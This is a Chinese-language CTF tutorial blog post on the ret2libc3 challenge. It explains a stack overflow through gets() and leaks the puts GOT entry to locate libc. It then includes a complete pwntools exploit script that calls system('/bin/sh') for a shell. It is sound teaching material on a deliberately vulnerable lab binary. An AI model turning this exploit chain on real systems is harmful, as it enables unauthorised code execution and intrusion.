# Pwn-ROP-ret2libc-高级


这里以 bamboofox 中的 ret2libc3 为例

点击下载: [ret2libc3](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3)

在例 2 的基础上，**再次将 system 函数的地址去掉**。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护

```
➜  ret2libc3 checksec ret2libc3
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
}
```

那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点

- system 函数属于 **libc**，而 libc.so 动态链接库中的函数**之间相对偏移是固定的**。
- 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下
- https://github.com/niklasb/libc-database

所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。

那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。**当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。**

我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme

- https://github.com/lieanu/LibcSearcher

此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。

这里的思路是，通过puts打印出自己的got地址。因为打印的时候已经执行过一遍puts了，所以此时got中肯定存在puts的真实地址。

```python
puts_plt = elf.plt['puts']
start = 0x080484D0
puts_got = elf.got['puts']

payload1 = b'a' * 112 + p32(puts_plt) + p32(start) + p32(puts_got)
r.sendlineafter('!?',payload1)
```

> PS：这里的start地址实际上是_start函数的地址。这个函数可以认为是程序的起点。当然这里使用libc_start_main也是可以的。只要能让程序重新执行即可

- 泄露 puts 地址
- 获取 libc 版本
- 获取libc基址（puts的真实地址减去puts的Libc地址）
- 获取 system 地址与 /bin/sh 的地址（system的libc地址加上libc基址）
- 再次执行源程序
- 触发栈溢出执行 system(‘/bin/sh’)

exp 如下：

```python
from pwn import *
from LibcSearcher import LibcSearcher

context(arch= 'i386', os = 'linux', log_level = 'debug')
elf = ELF('./ret2libc3')
r = process('./ret2libc3')

puts_plt = elf.plt['puts']
start = 0x080484D0
puts_got = elf.got['puts']

payload1 = b'a' * 112 + p32(puts_plt) + p32(start) + p32(puts_got)
r.sendlineafter('!?',payload1)

puts_addr = u32(r.recv(4))
libc = LibcSearcher("puts",puts_addr)
libcbase_addr = puts_addr - libc.dump('puts')

system_libc = libcbase_addr + libc.dump('system')
str_bin_sh = libcbase_addr + libc.dump('str_bin_sh')

payload2 = b'a' * 112 + p32(system_libc) + b'b' * 4 + p32(str_bin_sh)
r.sendlineafter('!?',payload2)

r.interactive()
```



---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/09/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7/  

